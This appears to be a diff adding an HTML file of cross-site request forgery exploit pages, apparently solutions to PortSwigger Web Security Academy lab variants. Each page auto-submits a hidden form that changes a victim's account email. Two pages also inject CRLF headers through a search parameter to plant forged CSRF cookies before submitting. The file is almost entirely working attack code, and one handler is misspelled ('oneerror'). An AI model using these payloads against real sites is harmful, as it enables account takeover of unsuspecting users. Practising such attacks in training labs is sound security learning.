@@ -1,0 +1,59 @@
+<!-- Basic CSRF -->
+<h1>Exploit CSRF </h1>
+<form method="POST" action="https://0a2700c704a0315f80666268003500df.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@user.net">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+
+
+<!-- CSRF where token validation depends on request method -->
+<h1>Exploit CSRF!</h1>
+<form action="https://0a7300df04482edc80a84eed00df00e8.web-security-academy.net/my-account/change-email" method="GET">
+    <input type="hidden" name="email" value="wiener@pwned.net">
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+
+<!-- CSRF where token validation is omitted -->
+<h1>Exploit CSRF!</h1>
+<form action="https://0ae0005c0377b259800208bc009d00b6.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="pwned@lmao.net">
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+
+<!-- CSRF where token is not tied to user session -->
+<h1>Exploit CSRF!</h1>
+<form action="https://0a6b00ea04b2196480ccc64900db00bd.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="wiecar@pwned.net">
+    <input type="hidden" name="csrf" value="8UkhI9ENyEPxQb87ox9sURbe1MwutHeZ">    
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+
+<!-- CSRF where token is tied to non-session cookie -->
+<h1> Exploit CSRF!</h1>
+<!-- Change victim's email automatically -->
+<form action="https://0a61004703dbb6fa84a72cfe00220027.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden", name="email", value="user@pwned.net">
+    <input type="hidden", name="csrf", value="tqDMQOIOdyC5TBSuFzVxy1k9KYRpkI6d">
+</form>
+<!-- Using search bar to inject http's header -->
+<img src="https://0a61004703dbb6fa84a72cfe00220027.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=8QgBDSNU5nqtBK8FT1Cpwy0LS1e7YcWL%3B%20SameSite=None" onerror="document.forms[0].submit()">
+
+<!-- CSRF where token is duplicated in cookie -->
+<h1> Exploit CSRF! </h1>
+<form action="https://0a4b0094045129aa813a71b7002a0068.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden", name="email", value="user@pwned.net">
+    <input type="hidden", name="csrf", value="fake">
+</form>
+<!-- Using search bar to inject http's header -->
+<img src="https://0a4b0094045129aa813a71b7002a0068.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" oneerror="document.forms[0].submit()">
